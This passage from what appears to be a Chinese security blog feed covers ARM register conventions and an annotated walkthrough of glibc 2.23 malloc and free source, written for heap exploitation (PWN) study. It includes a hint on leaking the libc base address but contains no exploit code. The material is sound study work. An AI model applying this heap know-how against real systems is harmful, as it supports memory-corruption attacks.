class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">r0 第一个参数和返回值  类似于eax</span><br><span class="line">r1第二个参数 类似于ebx</span><br><span class="line">r2第三个参数 类似于ecx</span><br><span class="line">r3第四个参数 类似于edx</span><br><span class="line">大于四个参数，使用栈传参</span><br><span class="line">r4-r10 通用寄存器  存储局部变量等</span><br><span class="line">r11/FP 栈帧寄存器类似于ebp</span><br><span class="line">r12保存立即数一般用于保存立即数</span><br><span class="line">SP 栈顶寄存器类似于esp</span><br><span class="line">LR 链接寄存器 保存返回地址</span><br><span class="line">PC 程序计数器保存当前执行地址</span><br></pre></td></tr></table></figure><p>arm64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">X0-X7 第1-7个参数和返回值最多支持7个寄存器参数</span><br><span class="line">X8-X18 临时寄存器</span><br><span class="line">X19-X28 callee-saved寄存器若使用需要保存原始值</span><br><span class="line">X29 栈帧寄存器类似于ebp</span><br><span class="line">X30 链接寄存器保存返回地址</span><br><span class="line">SP 栈顶寄存器类似于esp</span><br><span class="line">PC 程序计数器保存当前执行地址</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>GLIBC2.23内存源码分析</title>
      <link href="/2022/06/24/2.23GLIBC%E5%86%85%E5%AD%98%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
      <url>/2022/06/24/2.23GLIBC%E5%86%85%E5%AD%98%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>大部分的分析都写在了注释里，参考了一些师傅的博客和CTFwiki</p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h4 id="malloc-fastbin"><a href="#malloc-fastbin" class="headerlink" title="malloc_fastbin:"></a>malloc_fastbin:</h4><ul><li>malloc函数执行时,如果size在fastbin范围内，且fastbin内有合适的chunk,直接返回，否则去unsorted</li></ul><hr><h4 id="malloc-small-bin"><a href="#malloc-small-bin" class="headerlink" title="malloc_small_bin:"></a>malloc_small_bin:</h4><ul><li>malloc函数执行时,如果size在smallbin范围内，且smallbin内有合适的chunk，直接返回,否则去unsorted</li><li>size在largebin,consolidate合并，然后去unsorted</li></ul><hr><h4 id="malloc-unsorted-bin"><a href="#malloc-unsorted-bin" class="headerlink" title="malloc_unsorted_bin:"></a>malloc_unsorted_bin:</h4><ul><li>size在small_bin范围内，且存在chunk时last_remainder且size大于nb,直接切割然后返回,如果不是last_remainder，如果unsorted_bin里的chunk在small范围内，先放入small_bin，然后再切割取出，剩余的部分作为last_remainder放回unsorted。如果size再large范围内，先放入large，然后再切割取出（合适直接取出），剩余的部分作为last_remainder放回unsorted</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. 查找unsortedbin 是否为空</span><br><span class="line">2. unsortedbin 中只有一个chunk且为last_remainder时，进行last_remainder切分，返回</span><br><span class="line">3.否则：</span><br><span class="line">4. 将chunk从 unsortedbin中解链，如果大小满足则返回</span><br><span class="line">5. 如果chunk大小不满足， 是否满足small bin大小，并插入small bin中</span><br><span class="line">6. 如果chunk大小不满足small bin，是否满足larg bin，并插入 large bin中</span><br><span class="line">7. 对下一个chunk 进行处理</span><br><span class="line">8.当unsorted bin中没有合适的chunk时，则会遍历查找 请求的size 所对应的 bin中chunk</span><br></pre></td></tr></table></figure><h4 id="malloc-largebin"><a href="#malloc-largebin" class="headerlink" title="malloc_largebin:"></a>malloc_largebin:</h4><ul><li>如果用户申请的size所对应的large bin中不存在符合要求的chunk的情况，则在其他 size 的large bin中进行寻找。</li><li>如果符合用户请求的size 的bins 中没有满足要求的 chunk，则会继续在 large bin中寻找。不断遍历，直到找到符合要求的chunk，随后进行 chunk 划分等操作。</li><li>如果 large bin 中遍历结束，仍然没有找到相应的 chunk，则需要在 top chunk中寻找。</li><li>最后就是在top chunk进行分配，如果top chunk满足，则划分top chunk。如果不满足，首先会进行合并fastbin到large bin或者 small bin中，在继续进行遍历。如果没有fastbin可合并，程序会直接调用 <code>sysmalloc</code> 函数进行分配区分配。</li></ul><h4 id="sysmalloc"><a href="#sysmalloc" class="headerlink" title="sysmalloc:"></a>sysmalloc:</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>old-top chunk size 必须要对齐到内存页</span><br><span class="line"><span class="number">2.</span>size 要大于 MINSIZE(<span class="number">0x10</span>)</span><br><span class="line"><span class="number">3.</span>size 要小于之后申请的 chunk size + MINSIZE(<span class="number">0x10</span>)</span><br><span class="line"><span class="number">4.</span>size 的 prev inuse 位必须为 <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="一些自己容易忘记的小知识"><a href="#一些自己容易忘记的小知识" class="headerlink" title="一些自己容易忘记的小知识"></a>一些自己容易忘记的小知识</h2><ul><li><p>mmap出来的堆空间和libc的基地址的偏移是固定的，所以可以通过这种手段泄露libc基地址</p></li><li><p>堆空间大概长这样：</p><p><img src="https://img1.imgtp.com/2022/06/24/TTkcdT4j.png" alt="Snipaste_2022-06-24_13-02-15.png"></p></li><li><p>还有就是关于bins数组，fastbin是单独的，其他的0—1是unsorted_bin,2-63是small_bin,64-128是largebin</p></li></ul><h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><h4 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));<span class="comment">//检查是否有hook，如果有的话，就去执行hook</span></span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes); <span class="comment">//寻找arena分配内存</span></span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);<span class="comment">//调用malloc来申请内存</span></span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;<span class="comment">//如果失败就再次寻找</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);<span class="comment">//申请到了arena,释放分配区锁</span></span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));<span class="comment">//再次进行判断，是否申请到了内存，内存是否mmap,内存是否在其分配耳朵arena中</span></span><br><span class="line">  <span class="keyword">return</span> victim; <span class="comment">//返回堆地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来简单看一下malloc的过程：</p><p>开始-&gt;获取分配区锁-&gt;随后一次遍历fastbin(小于max_fast),smallbin(小于512B)，unsortedbin,largebin,top_chunk.如果大于mmap阈值，则使用mmap调用，如果不是main_arena，也采用mmap。大概就是这样了。</p><h4 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *_int_malloc(mstate av, <span class="type">size_t</span> bytes) &#123;</span><br><span class="line">    INTERNAL_SIZE_T nb;  <span class="comment">/* normalized request size */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>    idx; <span class="comment">/* associated bin index */</span></span><br><span class="line">    mbinptr         bin; <span class="comment">/* associated bin */</span></span><br><span class="line"></span><br><span class="line">    mchunkptr       victim;       <span class="comment">/* inspected/selected chunk */</span></span><br><span class="line">    INTERNAL_SIZE_T size;         <span class="comment">/* its size */</span></span><br><span class="line">    <span class="type">int</span>             victim_index; <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">    mchunkptr     remainder;      <span class="comment">/* remainder from a split */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> remainder_size; <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> block; <span class="comment">/* bit map traverser */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> bit;   <span class="comment">/* bit map traverser */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">map</span>;   <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">    mchunkptr fwd; <span class="comment">/* misc temp for linking */</span></span><br><span class="line">    mchunkptr bck; <span class="comment">/* misc temp for linking */</span></span><br><span class="line"><span class="comment">//定义了一些后续用的到的变量</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       Convert request size to internal form by adding SIZE_SZ bytes</span></span><br><span class="line"><span class="comment">       overhead plus possibly more to obtain necessary alignment and/or</span></span><br><span class="line"><span class="comment">       to obtain a size of at least MINSIZE, the smallest allocatable</span></span><br><span class="line"><span class="comment">       size. Also, checked_request2size traps (returning 0) request sizes</span></span><br><span class="line"><span class="comment">       that are so large that they wrap around zero when padded and</span></span><br><span class="line"><span class="comment">       aligned.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    checked_request2size(bytes, nb);</span><br><span class="line">    </span><br></pre></td></tr></table></figure><h4 id="int-malloc-fastbin部分"><a href="#int-malloc-fastbin部分" class="headerlink" title="_int_malloc fastbin部分"></a>_int_malloc fastbin部分</h4><p>这里唯一的一个检查就是malloc的size大小与fastbin索引的大小是否一致，fastbin使用bin的fd来获取chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">   This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">   can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast())) &#123;</span><br><span class="line">    <span class="comment">// 得到对应的fastbin的下标</span></span><br><span class="line">    idx             = fastbin_index(nb);</span><br><span class="line">    <span class="comment">// 得到对应的fastbin的头指针</span></span><br><span class="line">    mfastbinptr *fb = &amp;fastbin(av, idx);</span><br><span class="line">    mchunkptr    pp = *fb;</span><br><span class="line">    <span class="comment">// 利用fd遍历对应的bin内是否有空闲的chunk块，</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        victim = pp;</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="literal">NULL</span>) <span class="keyword">break</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd,</span><br><span class="line">                                                        victim)) != victim);</span><br><span class="line">    <span class="comment">// 存在可以利用的chunk</span></span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。</span></span><br><span class="line">        <span class="comment">// 根据取得的 victim ，利用 chunksize 计算其大小。</span></span><br><span class="line">        <span class="comment">// 利用fastbin_index 计算 chunk 的索引。</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect(fastbin_index(chunksize(victim)) != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">            errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">        errout:</span><br><span class="line">            malloc_printerr(check_action, errstr, chunk2mem(victim), av);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 细致的检查。。只有在 DEBUG 的时候有用</span></span><br><span class="line">        check_remalloced_chunk(av, victim, nb);</span><br><span class="line">        <span class="comment">// 将获取的到chunk转换为mem模式</span></span><br><span class="line">        <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">        <span class="comment">// 如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="int-malloc-smallbin部分"><a href="#int-malloc-smallbin部分" class="headerlink" title="_int_malloc smallbin部分"></a>_int_malloc smallbin部分</h4><p>这里的检查也只有一个，检查bck -&gt;fd &#x3D; victim</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">   hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">   (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">   processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">   anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb)) &#123;</span><br><span class="line">    <span class="comment">// 获取 small bin 的索引</span></span><br><span class="line">    idx = smallbin_index(nb);</span><br><span class="line">    <span class="comment">// 获取对应 small bin 中的 chunk 指针</span></span><br><span class="line">    bin = bin_at(av, idx);</span><br><span class="line">    <span class="comment">// 先执行 victim = last(bin)，获取 small bin 的最后一个 chunk</span></span><br><span class="line">    <span class="comment">// 如果 victim = bin ，那说明该 bin 为空。</span></span><br><span class="line">    <span class="comment">// 如果不相等，那么会有两种情况</span></span><br><span class="line">    <span class="keyword">if</span> ((victim = last(bin)) != bin) &#123;</span><br><span class="line">        <span class="comment">// 第一种情况，small bin 还没有初始化。</span></span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            <span class="comment">// 执行初始化，将 fast bins 中的 chunk 进行合并</span></span><br><span class="line">            malloc_consolidate(av);</span><br><span class="line">        <span class="comment">// 第二种情况，small bin 中存在空闲的 chunk</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">            bck = victim-&gt;bk;</span><br><span class="line">            <span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">                errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">            set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">            <span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br><span class="line">            <span class="comment">// 如果不是 main_arena，设置对应的标志</span></span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">            <span class="comment">// 细致的检查，非调试状态没有作用</span></span><br><span class="line">            check_malloced_chunk(av, victim, nb);</span><br><span class="line">            <span class="comment">// 将申请到的 chunk 转化为对应的 mem 状态</span></span><br><span class="line">            <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">            <span class="comment">// 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">            alloc_perturb(p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="int-malloc-largebin部分"><a href="#int-malloc-largebin部分" class="headerlink" title="_int_malloc largebin部分"></a>_int_malloc largebin部分</h4><p>当 fast bin、small bin 中的 chunk 都不能满足用户请求 chunk 大小时，就会考虑是不是 large bin。但是，其实在 large bin 中并没有直接去扫描对应 bin 中的 chunk，而是先利用 malloc_consolidate（参见 malloc_state 相关函数） 函数处理 fast bin 中的 chunk，将有可能能够合并的 chunk 先进行合并后放到 unsorted bin 中，不能够合并的就直接放到 unsorted bin 中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">   While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">   even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">   fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">   Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">   large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">   invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">   it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 获取large bin的下标。</span></span><br><span class="line">    idx = largebin_index(nb);</span><br><span class="line">    <span class="comment">// 如果存在fastbin的话，会处理 fastbin</span></span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks(av)) malloc_consolidate(av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后续部分代码比较多，就简单描述一下吧，大致意思就是合并后的chunk，首先放到unsorted bin中，然后便历unsorted_bin，如果有合适的就取出，如果chunk过大则进行切割，剩下的根据大小放入small bin或者 large_bin中去。</p><p>如果合并后依然没有足够的空闲空间，那么就会切割top_chunk，依然不够的话就mmap。</p><h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><h4 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __libc_free(<span class="type">void</span> *mem) &#123;</span><br><span class="line">    mstate    ar_ptr;</span><br><span class="line">    mchunkptr p; <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line">    <span class="comment">// 判断是否有钩子函数 __free_hook</span></span><br><span class="line">    <span class="type">void</span> (*hook)(<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *) = atomic_forced_read(__free_hook);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">        (*hook)(mem, RETURN_ADDRESS(<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// free NULL没有作用</span></span><br><span class="line">    <span class="keyword">if</span> (mem == <span class="number">0</span>) <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// 将mem转换为chunk状态</span></span><br><span class="line">    p = mem2chunk(mem);</span><br><span class="line">    <span class="comment">// 如果该块内存是mmap得到的</span></span><br><span class="line">    <span class="keyword">if</span> (chunk_is_mmapped(p)) <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span></span><br><span class="line"><span class="comment">       Dumped fake mmapped chunks do not affect the threshold.  */</span></span><br><span class="line">        <span class="keyword">if</span> (!mp_.no_dyn_threshold &amp;&amp; chunksize_nomask(p) &gt; mp_.mmap_threshold &amp;&amp;</span><br><span class="line">            chunksize_nomask(p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX &amp;&amp;</span><br><span class="line">            !DUMPED_MAIN_ARENA_CHUNK(p)) &#123;</span><br><span class="line">            mp_.mmap_threshold = chunksize(p);</span><br><span class="line">            mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">            LIBC_PROBE(memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                       mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">        munmap_chunk(p);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 根据chunk获得分配区的指针</span></span><br><span class="line">    ar_ptr = arena_for_chunk(p);</span><br><span class="line">    <span class="comment">// 执行释放</span></span><br><span class="line">    _int_free(ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="int-free"><a href="#int-free" class="headerlink" title="__int_free"></a>__int_free</h4><p>三个检查一个是chunk的size是否对齐，一个是指针地址是否合法，还有就是chunk是否处于使用状态。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> _int_free(mstate av, mchunkptr p, <span class="type">int</span> have_lock) &#123;</span><br><span class="line">    INTERNAL_SIZE_T size;      <span class="comment">/* its size */</span></span><br><span class="line">    mfastbinptr *   fb;        <span class="comment">/* associated fastbin */</span></span><br><span class="line">    mchunkptr       nextchunk; <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">    INTERNAL_SIZE_T nextsize;  <span class="comment">/* its size */</span></span><br><span class="line">    <span class="type">int</span>             nextinuse; <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">    INTERNAL_SIZE_T prevsize;  <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">    mchunkptr       bck;       <span class="comment">/* misc temp for linking */</span></span><br><span class="line">    mchunkptr       fwd;       <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span>         locked = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    size = chunksize(p);</span><br><span class="line">    <span class="comment">//定义一些用的的变量</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="comment">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class="line"><span class="comment">       allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">       Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">       here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line">    <span class="comment">// 指针不能指向非法的地址</span></span><br><span class="line">    <span class="comment">// 指针必须得对齐，2*SIZE_SZ</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect((<span class="type">uintptr_t</span>) p &gt; (<span 